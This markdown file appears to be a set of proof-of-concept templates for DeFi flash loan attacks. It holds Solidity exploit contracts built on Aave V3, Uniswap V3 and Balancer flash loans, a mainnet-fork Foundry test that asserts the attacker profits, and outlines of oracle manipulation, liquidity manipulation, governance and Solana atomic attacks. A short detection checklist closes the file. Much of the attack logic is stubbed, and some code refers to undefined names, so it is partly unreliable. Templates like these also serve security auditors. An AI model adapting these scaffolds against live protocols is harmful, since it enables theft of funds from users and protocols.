# Flash Loan Attack PoC Templates

## EVM - Foundry (Aave V3)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@aave/v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import "@aave/v3-core/contracts/interfaces/IPoolAddressesProvider.sol";

contract FlashLoanExploit is FlashLoanSimpleReceiverBase {
    address public target;
    address public owner;

    constructor(address _provider, address _target) 
        FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_provider)) 
    {
        target = _target;
        owner = msg.sender;
    }

    function attack(address asset, uint256 amount) external {
        POOL.flashLoanSimple(address(this), asset, amount, "", 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        // ========== ATTACK LOGIC ==========
        
        // 1. Manipulate price oracle
        // 2. Exploit vulnerable protocol
        // 3. Extract profit
        
        IVulnerable(target).exploit(amount);
        
        // ========== END ATTACK ==========
        
        // Repay flash loan
        uint256 amountOwed = amount + premium;
        IERC20(asset).approve(address(POOL), amountOwed);
        
        return true;
    }

    function withdraw(address token) external {
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }
}

contract FlashLoanTest is Test {
    address constant AAVE_POOL_PROVIDER = 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    
    FlashLoanExploit exploit;
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
        
        vm.prank(attacker);
        exploit = new FlashLoanExploit(AAVE_POOL_PROVIDER, TARGET_ADDRESS);
    }

    function testFlashLoanAttack() public {
        uint256 balanceBefore = IERC20(WETH).balanceOf(attacker);
        
        vm.prank(attacker);
        exploit.attack(WETH, 1000 ether);
        
        vm.prank(attacker);
        exploit.withdraw(WETH);
        
        uint256 balanceAfter = IERC20(WETH).balanceOf(attacker);
        assertGt(balanceAfter, balanceBefore, "Should profit from attack");
    }
}
```

## EVM - Uniswap V3 Flash
```solidity
import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3FlashCallback.sol";

contract UniswapFlashExploit is IUniswapV3FlashCallback {
    IUniswapV3Pool public pool;
    
    function attack(uint256 amount0, uint256 amount1) external {
        pool.flash(address(this), amount0, amount1, "");
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external override {
        // Attack logic here
        
        // Repay with fee
        if (fee0 > 0) IERC20(token0).transfer(address(pool), amount0 + fee0);
        if (fee1 > 0) IERC20(token1).transfer(address(pool), amount1 + fee1);
    }
}
```

## EVM - Balancer Flash Loan
```solidity
import "@balancer-labs/v2-interfaces/contracts/vault/IFlashLoanRecipient.sol";

contract BalancerFlashExploit is IFlashLoanRecipient {
    IVault public vault;

    function attack(address[] memory tokens, uint256[] memory amounts) external {
        vault.flashLoan(this, tokens, amounts, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        // Attack logic
        
        // Repay
        for (uint256 i = 0; i < tokens.length; i++) {
            tokens[i].transfer(address(vault), amounts[i] + feeAmounts[i]);
        }
    }
}
```

## Common Attack Patterns

### Price Oracle Manipulation
```solidity
function executeOperation(...) external returns (bool) {
    // 1. Borrow large amount
    // 2. Swap on DEX to manipulate spot price
    IUniswap(uniswap).swap(borrowedAmount, 0, path, address(this));
    
    // 3. Exploit protocol using manipulated price
    IVulnerable(target).borrow(collateral); // Uses spot price as oracle
    
    // 4. Swap back
    IUniswap(uniswap).swap(0, originalAmount, reversePath, address(this));
    
    // 5. Profit
    return true;
}
```

### Liquidity Manipulation
```solidity
function executeOperation(...) external returns (bool) {
    // 1. Add/remove liquidity to manipulate LP token price
    // 2. Exploit protocol that values LP tokens incorrectly
    // 3. Reverse liquidity operation
    return true;
}
```

### Governance Attack
```solidity
function executeOperation(...) external returns (bool) {
    // 1. Borrow governance tokens
    // 2. Create and execute malicious proposal
    // 3. Extract value
    // 4. Return tokens
    return true;
}
```

## Solana Flash Loan (via CPI)
```rust
// Solana doesn't have native flash loans like EVM
// But similar attacks possible via atomic transactions

#[test]
fn test_atomic_attack() {
    // Bundle multiple instructions atomically
    let ixs = vec![
        // 1. Borrow from lending protocol
        lending::instruction::borrow(...),
        // 2. Manipulate AMM price
        amm::instruction::swap(...),
        // 3. Exploit vulnerable protocol
        target::instruction::exploit(...),
        // 4. Swap back
        amm::instruction::swap(...),
        // 5. Repay loan
        lending::instruction::repay(...),
    ];
    
    // All execute atomically or all fail
    process_transaction(&ixs, &signers).unwrap();
}
```

## Detection Checklist
- [ ] Protocol uses spot price as oracle
- [ ] No TWAP or time-weighted checks
- [ ] Large liquidity available for borrowing
- [ ] Single-block price manipulation possible
- [ ] No flash loan guards
- [ ] Governance with no timelock
